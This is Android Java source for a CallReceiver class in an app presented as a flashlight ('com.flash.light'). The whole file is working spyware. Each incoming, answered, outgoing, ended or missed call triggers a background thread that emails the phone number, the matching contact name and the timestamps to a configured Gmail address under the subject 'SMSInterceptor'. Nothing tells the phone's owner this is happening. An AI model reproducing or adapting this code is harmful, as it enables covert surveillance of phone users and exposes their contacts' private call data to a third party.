package com.flash.light;

import android.util.Log;

import java.util.List;
import java.util.Date;

import android.content.Intent;
import android.content.Context;

import android.telephony.SmsMessage;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class CallReceiver extends PhoneCallReceiver {

  private static Contacts contact;
  private static GmailSender sender;
  private static Configure configure;

  private static String gmailEmailString;

  private static final String TAG = "FlashLight CallReceiver";

  public CallReceiver() { 
    contact   = new Contacts();
    configure = new Configure();
    gmailEmailString = configure.emailAddress();
    Log.i(TAG, "CallReceiver() constructor gmailEmailString: " + gmailEmailString);
  }

  public String endPoint(final String number, final Context context) {

    String end_point;
    final String contact_name  = contact.getContactName(number, context);

    if(!contact_name.isEmpty()) {
      end_point = "" + number + "(" + contact_name + ")";
    }
    else {
      end_point = number;
    }
    return end_point;
  }

  @Override
  protected void onIncomingCallReceived(final Context context, final String number, final Date start) { 
    Log.i(TAG,"Entering onIncomingCallReceived()");
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor",
            "Incoming call started\nNumber: " + endPoint(number, context) + "\nStart Time: " + start,
            gmailEmailString);
          Log.i(TAG, "onIncomingCallReceived() Sending E-mail.");
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "onIncomingCallReceived() Exception e " + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onIncomingCallAnswered(final Context context, final String number, final Date start) {
    Log.i(TAG,"Entering onIncomingCallAnswered()");
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor",
            "Incoming call answered\nNumber: " + endPoint(number, context) + "\nStart Time: " + start,
            gmailEmailString);
          Log.i(TAG, "onIncomingCallAnswered() Sending E-mail.");
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "onIncomingCallAnswered() Exception e " + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onIncomingCallEnded(final Context context, final String number, final Date start, final Date end) { 
    Log.i(TAG,"Entering onIncomingCallEnded()");
    new Thread(new Runnable() {

     @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor",
            "Incoming call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end,
            gmailEmailString);
          Log.i(TAG, "onIncomingCallEnded() Sending E-mail.");
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "onIncomingCallEnded() Exception e " + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onOutgoingCallStarted(final Context context, final String number, final Date start) { 
    Log.i(TAG,"Entering onOutgoingCallStarted()");
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor",
            "Outgoing call started!\nNumber: " + endPoint(number, context) + "\nStart Time: " + start,
            gmailEmailString);
          Log.i(TAG, "onOutgoingCallStarted() Sending E-mail.");
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "onOutgoingCallStarted() Exception e " + e.toString());
        }
      }
    }).start();
  } 

  @Override 
  protected void onOutgoingCallEnded(final Context context, final String number, final Date start, final Date end) { 
    Log.i(TAG,"Entering onOutgoingCallEnded()");
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor",
            "Outgoing call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end,
            gmailEmailString);
          Log.i(TAG, "onOutgoingCallEnded() Sending E-mail.");
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "onOutgoingCallEnded() Exception e " + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onMissedCall(final Context context, final String number, final Date start) { 
    Log.i(TAG,"Entering onMissedCall()");
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor",
            "Missed call\nNumber: " + endPoint(number, context) + "\nTime: " + start,
            gmailEmailString);
          Log.i(TAG, "onMissedCall() Sending E-mail.");
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "onMissedCall() Exception e " + e.toString());
        }
      }
    }).start();
  }

}
